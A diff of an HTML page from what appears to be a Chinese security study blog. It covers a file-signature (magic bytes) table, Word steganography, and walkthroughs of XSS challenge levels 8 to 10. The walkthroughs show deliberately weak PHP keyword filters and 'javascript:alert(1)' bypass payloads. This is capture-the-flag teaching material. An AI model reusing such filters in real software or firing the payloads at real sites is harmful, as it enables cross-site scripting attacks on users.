-<h1 id="常见文件头汇总"><a href="#常见文件头汇总" class="headerlink" title="常见文件头汇总"></a>常见文件头汇总</h1><p>JPEG (jpg)，文件头：FFD8FF    文件尾：AE 42 60 82<br>PNG (png)，文件头：89504E470D0A1A0A<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email <a href="eml">thorough only</a>，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p>
+<h1 id="常见文件头汇总"><a href="#常见文件头汇总" class="headerlink" title="常见文件头汇总"></a>常见文件头汇总</h1><p>JPEG (jpg)，文件头：FFD8FF    文件尾：AE 42 60 82<br>PNG (png)，文件头：89504E470D0A1A0A<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p>
 <h1 id="Word-隐写"><a href="#Word-隐写" class="headerlink" title="Word 隐写"></a>Word 隐写</h1><p>word 本质是一个压缩包，可以隐藏图片或 txt</p>
 <p>显示隐藏内容：文件-&gt;显示-&gt;隐藏文字</p>
 <figure class="image-bubble">
@@ -15957,7 +16099,7 @@
 <h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'"'</span>,$str6);</span><br></pre></td></tr></table></figure>
 
 <p>对传入的转换成小写，同时匹配一些关键字进行替换<br><code>javascript:alert(1)</code></p>
-<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>要带着http://才行，直接后面注释一下，带着就可以了<br><code>javascript:alert(1)//http://yichen.com</code></p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>要带着 http://才行，直接后面注释一下，带着就可以了<br><code>javascript:alert(1)//http://yichen.com</code></p>
 <h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">"'.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">"'.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"'.$str33.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure>
 
 <p>源码中可以传递的参数是 keyword 跟 t_sort，对  keyword  进行了  htmlspecialchars()  函数操作，即进行了 html 编码，使用 t_sort  过滤掉了尖括号，想要使用的话需要构造出正常的 js</p>
